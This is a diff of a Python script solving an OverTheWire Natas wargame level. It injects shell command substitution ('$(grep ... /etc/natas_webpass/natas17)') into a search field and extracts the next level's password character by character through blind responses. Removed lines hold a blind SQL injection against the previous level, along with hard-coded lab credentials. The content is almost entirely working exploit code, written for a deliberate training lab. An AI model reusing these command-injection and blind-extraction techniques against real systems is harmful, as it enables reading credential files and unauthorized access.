@@ -7,24 +7,32 @@ chars = ''.join([string.ascii_letters,string.digits])
 filtered = ''
 passwd = ''
 
+# Data = {'needle':'$(grep /etc/natas_webpass/natas17)', 'submit':'Search'}
+# r = requests.post(
+#         uri,
+#         auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
+#         data=Data)
+# print(r)
 for char in chars:
-    # Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    Data = {'needle':'$(grep ' + char + ' /etc/natas_webpass/natas17)', 'submit':'Search'}
     r = requests.post(
-            uri + '?needle=$(grep -O' + char + ' /etc/natas_webpass/natas17)&submit=Search',
-            auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
-    print(r.text)
-    # if 'exists' in r.text:
-    #     filtered = filtered + char
-    #     print(filtered)
+            uri,
+            auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
+            data=Data)
+    if 'iris' not in r.text:
+        filtered = filtered + char
+        print(filtered)
 
-# for i in range(0,32):
-#     for char in filtered:
-#         Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
-#         r = requests.post(
-#             'http://natas15.natas.labs.overthewire.org/index.php?debug',
-#             auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
-#             data = Data)
-#         if 'exists' in r.text:
-#             passwd = passwd + char
-#             print(passwd)
-#             break
+print('Done filtering chars, continuing finding the password:')
+for i in range(0,32):
+    for char in filtered:
+        Data = {'needle' : '$(grep -E ^' + passwd + char + ' /etc/natas_webpass/natas17)',
+                'submit' : 'Search'}
+        r = requests.post(
+            uri,
+            auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
+            data = Data)
+        if 'iris' not in r.text:
+            passwd = passwd + char
+            print(passwd)
+            break
